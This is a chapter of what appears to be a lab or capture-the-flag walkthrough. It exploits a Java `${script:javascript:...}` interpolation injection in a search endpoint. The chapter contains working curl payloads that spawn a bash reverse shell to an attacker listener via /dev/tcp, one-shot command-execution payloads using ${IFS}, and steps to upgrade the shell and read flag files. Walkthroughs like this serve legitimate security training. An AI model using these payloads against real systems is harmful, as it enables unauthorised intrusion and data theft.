# 04 — Foothold: shell as `dev`

Arbitrary Java means `ProcessBuilder`, and `ProcessBuilder` means a shell. This chapter turns the
timing oracle into an interactive session and takes the user flag.

| Step | Runs on |
|---|---|
| 4.1 Listener | Kali |
| 4.2 Trigger | Kali → target |
| 4.3 Shell and TTY upgrade | target |
| 4.4 User flag | target |
| 4.5 One-shot command execution (no shell) | Kali → target |

---

## 4.1 Start a listener

**On Kali**

```bash
ncat -lv 4445
```

```
Ncat: Version 7.99 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4445
Ncat: Listening on 0.0.0.0:4445
```

## 4.2 Trigger the shell

Two details matter in the payload:

1. **Use `ProcessBuilder` with separate arguments, not `Runtime.exec(String)`.** `exec(String)`
   tokenises on whitespace, so `bash -c "bash -i >& ..."` gets shredded into the wrong argv. The
   `ProcessBuilder(String...)` constructor takes each argument explicitly.
2. **All the shell redirection must sit inside the single `-c` argument** — the quotes are part of
   the Java string, not of a shell command line, because there is no shell yet.

**On Kali**

```bash
curl -sS -G --data-urlencode 'query=${script:javascript:new java.lang.ProcessBuilder("/bin/bash","-c","bash -i >& /dev/tcp/192.168.45.158/4445 0>&1").start();}' \
  "http://192.168.237.150:8080/search"
```

```
{"query":"${script:javascript:new java.lang.ProcessBuilder(\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/192.168.45.158/4445 0>&1\").start();}","result":""}
```

Still a 200 with an empty `result` — the handler has no idea anything happened. The listener does:

```
Ncat: Connection from 192.168.237.150:38712.
bash: cannot set terminal process group (680): Inappropriate ioctl for device
bash: no job control in this shell
dev@lab-pwk2-student-cl5-150-ubuntu20-berlin-241-187:/$
```

The `cannot set terminal process group (680)` line is a gift: **PID 680** is the JVM that spawned
us, so the shell is a child of the vulnerable application. That is confirmed directly in 4.3.

## 4.3 Identify the shell and upgrade the TTY

**On the target**

```bash
id; hostname
ps -eo user,pid,args | grep '[j]ava'
```

```
uid=1001(dev) gid=1001(dev) groups=1001(dev)
lab-pwk2-student-cl5-150-ubuntu20-berlin-241-187
dev          680 java -jar /opt/dev/api.jar
```

`uid=1001(dev)` — an unprivileged service account, and PID 680 is `java -jar /opt/dev/api.jar`
running as the same user. The RCE runs as the application, as expected.

The session is a dumb pipe: no job control, no `sudo` prompts, no `vi`. Upgrade it:

**On the target**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

then, hitting `Ctrl-Z` to background it:

**On Kali** (in the same ncat terminal)

```bash
stty raw -echo; fg
```

and once back in the shell:

**On the target**

```bash
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 48 cols 200
```

Not strictly necessary for the rest of this box — every command from here on is non-interactive —
but it makes `sudo`/`su` usable if a password ever turns up.

## 4.4 User flag

`local.txt` is world-unreadable except by its owner, which we now are:

**On the target**

```bash
ls -la /home/dev
cat /home/dev/local.txt
```

```
total 24
drwxr-x--- 2 dev  dev  4096 Nov  7  2022 .
drwxr-xr-x 5 root root 4096 Nov 15 23:32 ..
lrwxrwxrwx 1 root root    9 Nov  7  2022 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Nov  7  2022 .bash_logout
-rw-r--r-- 1 dev  dev  3771 Nov  7  2022 .bashrc
-rw-r----- 1 dev  dev    33 Nov 15 23:34 local.txt
-rw-r--r-- 1 dev  dev   807 Nov  7  2022 .profile
6851d85c0e1e82991b98fa6e146532fd
```

Note `.bash_history -> /dev/null`: history is discarded, so there is nothing to mine from previous
sessions. The box has been cleaned.

## 4.5 One-shot command execution, without a shell

Sometimes a callback is impossible (no egress, or you only need one command). The same vulnerability
executes a single command and blocks until it finishes:

**On Kali**

```bash
curl -sS -G --data-urlencode 'query=${script:javascript:java.lang.Runtime.getRuntime().exec("bash -c id>/tmp/out").waitFor();}' \
  "http://192.168.237.150:8080/search"
```

The command must contain **no spaces**, because `exec(String)` splits on them. If you need
separators, use `${IFS}` — inside the URL-encoded parameter the shell never sees it, but the JVM
passes the literal string to `bash -c`, and `bash` expands it:

**On Kali**

```bash
curl -sS -G --data-urlencode 'query=${script:javascript:java.lang.Runtime.getRuntime().exec("bash -c cat${IFS}/root/proof.txt>/tmp/out").waitFor();}' \
  "http://192.168.237.150:8080/search"
```

That particular one fails as `dev` (the file is root-only) — it is here to show the syntax, not the
result. `.waitFor()` keeps the substitution running until the process exits, so a short command
leaves the HTTP request hanging for exactly as long as the command takes.

With a stable shell in hand, enumeration is next. → [05 — Host enumeration](05-enumeration.md)
